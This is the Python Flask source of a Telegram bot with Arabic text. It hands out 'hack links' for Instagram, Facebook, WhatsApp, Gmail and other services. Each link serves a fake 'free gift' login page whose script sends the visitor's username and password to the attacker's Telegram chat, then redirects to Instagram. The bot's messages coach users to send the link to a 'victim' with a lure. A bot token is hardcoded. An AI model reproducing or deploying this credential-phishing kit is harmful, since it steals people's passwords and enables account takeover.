from flask import Flask, request
import requests
import os

app = Flask(__name__)

# 🔐 معلومات البوت الأساسية (لا تغيرها)
TOKEN = "8616151144:AAFZ8FrVAfcrfK9UvSjZkwITdworNmTnwno"  # توكن البوت
BASE_URL = os.environ.get("RENDER_EXTERNAL_URL", "https://telegram-bot-lqcp.onrender.com")  # رابط البوت

# 🔘 أزرار البوت (15 ميزة فقط)
BUTTONS = [
    ["🔥 اختراق انستقرام", "🔥 اختراق فيسبوك", "🔥 اختراق واتساب"],
    ["🔥 اختراق سناب شات", "🔥 اختراق تيك توك", "🔥 اختراق فري فاير"],
    ["🔥 اختراق بوبجي", "🔥 اختراق ديسكورد", "🔥 اختراق تويتر"],
    ["🔥 اختراق جيميل", "🔥 اختراق كاميرا أمامية", "🔥 اختراق كاميرا خلفية"],
    ["🎙️ تسجيل صوت الضحية", "📍 تحديد موقع الضحية", "💀 سرقة باسووردات"],
    ["🎁 يوزرات مميزة", "❓ الدعم الفني"]
]

# 📋 رسالة الترحيب (باسمك ويوزرك)
WELCOME_MESSAGE = f"""
👑 *مرحبا بك في بوت خالد ابو الجود الأسطوري* 👑
━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ *استعد لاختراق أي حساب بضغطة زر!*

• كل زر يعطيك رابط اختراق جاهز.
• أرسل الرابط للضحية وانتظر البيانات.

📞 *الدعم الفني:* @A_c64
━━━━━━━━━━━━━━━━━━━━━━━━━━
*اختر الميزة من الأزرار 👇*
"""

# دالة إرسال الرسائل والأزرار
def send_message(chat_id, text, keyboard=None):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    if keyboard:
        data["reply_markup"] = {"keyboard": keyboard, "resize_keyboard": True}
    requests.post(url, json=data)

# ⛓️ دالة إرسال رابط الاختراق
def send_hack_link(chat_id, platform_name, page_name):
    link = f"{BASE_URL}/{page_name}.html?chatId={chat_id}"
    message = f"""
🔥 *رابط اختراق {platform_name} (جاهز للإرسال)* 🔥
━━━━━━━━━━━━━━━━━━━━━━━━━━
📎 *الرابط السحري:*
`{link}`

💡 *كيف تستخدمه؟*
1️⃣ انسخ الرابط.
2️⃣ أرسله للضحية مع رسالة مثلاً: *"عرض حصري! احصل على هديتك المجانية"*.
3️⃣ عندما يدخل بياناته، ستصل إليك فوراً.

📞 *الدعم الفني:* @A_c64
"""
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": message, "parse_mode": "Markdown"}
    requests.post(url, json=data)

# دالة لليوزرات المميزة
def send_username(chat_id):
    username_list = [
        "oz2bu", "jq5wm", "et1d0", "ec4t2", "4h0a3", "zz5c0", "cw6r6", "oa4oq", "kl7cw", "382m0", 
        "xv49w", "9d7j7", "2a8w0", "5v4a0", "bi9tk", "rt1gj", "8f6q9", "48m05", "p91xy", "24p51",
        "mn0qv", "lb3pk", "4b9mb", "qz39d", "uw1yl", "8p88g", "5s7l0", "fq5su", "7h5at", "6j5rc"
    ]
    chosen = random.choice(username_list)
    message = f"""
🎁 *تم اهدائك يوزر مميز من ابو الجود* 🎁
━━━━━━━━━━━━━━━━━━━━━━━━━━
📛 *اليوزر:* `{chosen}`

⚠️ ملاحظة: إذا كان اليوزر غير متاح، تواصل معي على @A_c64 فوراً.
━━━━━━━━━━━━━━━━━━━━━━━━━━
📞 *الدعم:* @A_c64
"""
    send_message(chat_id, message)

# صفحة الاختراق الرئيسية (ستظهر للضحية)
def phishing_page(platform, chat_id):
    return f"""
<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>{platform} | هدية مجانية</title>
<style>
*{{margin:0;padding:0;font-family:system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;}}
body{{background:linear-gradient(135deg, #667eea 0%, #764ba2 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px;}}
.container{{background:white;border-radius:28px;padding:30px;max-width:400px;width:100%;text-align:center;box-shadow:0 20px 35px rgba(0,0,0,0.2);}}
.logo{{font-size:55px;margin-bottom:10px;}}
h2{{font-size:24px;margin-bottom:15px;color:#1e1e2f;}}
.offer{{background:linear-gradient(90deg, #f9ed32, #f9a825);padding:12px;border-radius:60px;margin:20px 0;font-weight:bold;color:#000;}}
.offer span{{font-size:26px;font-weight:900;}}
input{{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:12px;font-size:15px;background:#fafafa;transition:0.3s;}}
input:focus{{outline:none;border-color:#0095f6;background:white;}}
button{{background:#0095f6;color:white;width:100%;padding:14px;border:none;border-radius:12px;font-size:18px;font-weight:bold;cursor:pointer;transition:0.3s;}}
button:hover{{background:#0077c2;}}
.progress-area{{display:none;margin-top:20px;}}
.progress-bar{{background:#e0e0e0;border-radius:25px;height:12px;overflow:hidden;}}
.progress-fill{{background:#0095f6;width:0%;height:100%;border-radius:25px;transition:width 0.2s;}}
.progress-text{{margin-top:10px;font-size:14px;color:#333;}}
</style>
</head>
<body>
<div class="container">
<div class="logo">🎁✨</div>
<h2>{platform} | هدية مجانية</h2>
<div class="offer"><span>عرض خاص!</span><br>احصل على هديتك الآن</div>
<div id="loginBox">
<input type="text" id="username" placeholder="اسم المستخدم أو البريد الإلكتروني">
<input type="password" id="password" placeholder="كلمة المرور">
<button onclick="sendCredentials()">🚀 احصل على الهدية 🚀</button>
</div>
<div id="progressArea" class="progress-area">
<div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
<div class="progress-text" id="progressText">جاري تجهيز هديتك...</div>
</div>
</div>
<script>
const chatId = "{chat_id}";
async function sendCredentials() {{
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    if(!username || !password) return;
    document.getElementById('loginBox').style.display = 'none';
    document.getElementById('progressArea').style.display = 'block';
    let percent = 1;
    const interval = setInterval(() => {{
        percent += Math.floor(Math.random() * 7) + 3;
        if(percent >= 100) percent = 100;
        document.getElementById('progressFill').style.width = percent + '%';
        document.getElementById('progressText').innerHTML = 'جاري التجهيز ' + percent + '%';
        if(percent >= 100) clearInterval(interval);
    }}, 180);
    await fetch('https://api.telegram.org/bot{TOKEN}/sendMessage', {{
        method: 'POST',
        headers: {{'Content-Type': 'application/json'}},
        body: JSON.stringify({{
            chat_id: chatId,
            text: `🔥 اختراق جديد!\\n📱 المنصة: {platform}\\n👤 المستخدم: ${{username}}\\n🔑 كلمة المرور: ${{password}}`
        }})
    }});
    setTimeout(() => {{
        document.getElementById('progressText').innerHTML = '✅ تم إرسال هديتك بنجاح!';
        setTimeout(() => window.location.href = 'https://www.instagram.com', 2000);
    }}, 2800);
}}
</script>
</body>
</html>
    """

# إنشاء مسارات الروابط لكل منصة
@app.route('/instagram.html')
def instagram_route(): return phishing_page("انستقرام", request.args.get('chatId'))
@app.route('/facebook.html')
def facebook_route(): return phishing_page("فيسبوك", request.args.get('chatId'))
@app.route('/whatsapp.html')
def whatsapp_route(): return phishing_page("واتساب", request.args.get('chatId'))
@app.route('/snapchat.html')
def snapchat_route(): return phishing_page("سناب شات", request.args.get('chatId'))
@app.route('/tiktok.html')
def tiktok_route(): return phishing_page("تيك توك", request.args.get('chatId'))
@app.route('/freefire.html')
def freefire_route(): return phishing_page("فري فاير", request.args.get('chatId'))
@app.route('/pubg.html')
def pubg_route(): return phishing_page("بوبجي", request.args.get('chatId'))
@app.route('/discord.html')
def discord_route(): return phishing_page("ديسكورد", request.args.get('chatId'))
@app.route('/twitter.html')
def twitter_route(): return phishing_page("تويتر", request.args.get('chatId'))
@app.route('/gmail.html')
def gmail_route(): return phishing_page("جيميل", request.args.get('chatId'))
@app.route('/camera_front.html')
def camera_front_route(): return phishing_page("كاميرا أمامية", request.args.get('chatId'))
@app.route('/camera_back.html')
def camera_back_route(): return phishing_page("كاميرا خلفية", request.args.get('chatId'))
@app.route('/recording.html')
def recording_route(): return phishing_page("تسجيل صوت", request.args.get('chatId'))
@app.route('/location.html')
def location_route(): return phishing_page("تحديد موقع", request.args.get('chatId'))
@app.route('/virus.html')
def virus_route(): return phishing_page("فيروس سرقة باسووردات", request.args.get('chatId'))

# الصفحة الرئيسية (للتأكد من شغال الخادم)
@app.route('/')
def home():
    return "✅ البوت الأسطوري شغال 24 ساعة! ابو الجود"

# ✅ ربط أوامر البوت (Webhook)
@app.route(f"/{TOKEN}/webhook", methods=["POST"])
def webhook():
    try:
        update = request.get_json()
        if "message" in update:
            chat_id = update["message"]["chat"]["id"]
            user_text = update["message"].get("text", "")
            
            if user_text == "/start":
                send_message(chat_id, WELCOME_MESSAGE, BUTTONS)
                
            elif user_text == "🎁 يوزرات مميزة":
                send_username(chat_id)
                
            elif user_text == "❓ الدعم الفني":
                send_message(chat_id, f"📞 للتواصل والدعم الفني: @A_c64")
                
            # جميع أزرار الاختراق
            elif user_text == "🔥 اختراق انستقرام": send_hack_link(chat_id, "انستقرام", "instagram")
            elif user_text == "🔥 اختراق فيسبوك": send_hack_link(chat_id, "فيسبوك", "facebook")
            elif user_text == "🔥 اختراق واتساب": send_hack_link(chat_id, "واتساب", "whatsapp")
            elif user_text == "🔥 اختراق سناب شات": send_hack_link(chat_id, "سناب شات", "snapchat")
            elif user_text == "🔥 اختراق تيك توك": send_hack_link(chat_id, "تيك توك", "tiktok")
            elif user_text == "🔥 اختراق فري فاير": send_hack_link(chat_id, "فري فاير", "freefire")
            elif user_text == "🔥 اختراق بوبجي": send_hack_link(chat_id, "بوبجي", "pubg")
            elif user_text == "🔥 اختراق ديسكورد": send_hack_link(chat_id, "ديسكورد", "discord")
            elif user_text == "🔥 اختراق تويتر": send_hack_link(chat_id, "تويتر", "twitter")
            elif user_text == "🔥 اختراق جيميل": send_hack_link(chat_id, "جيميل", "gmail")
            elif user_text == "🔥 اختراق كاميرا أمامية": send_hack_link(chat_id, "كاميرا أمامية", "camera_front")
            elif user_text == "🔥 اختراق كاميرا خلفية": send_hack_link(chat_id, "كاميرا خلفية", "camera_back")
            elif user_text == "🎙️ تسجيل صوت الضحية": send_hack_link(chat_id, "تسجيل صوت", "recording")
            elif user_text == "📍 تحديد موقع الضحية": send_hack_link(chat_id, "تحديد موقع", "location")
            elif user_text == "💀 سرقة باسووردات": send_hack_link(chat_id, "فيروس سرقة باسووردات", "virus")
                
            else:
                send_message(chat_id, "❌ أمر غير معروف. أرسل /start لبدء البوت.", BUTTONS)
    except Exception as e:
        print(f"Webhook Error: {e}")
    return "OK", 200

# تشغيل البوت
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
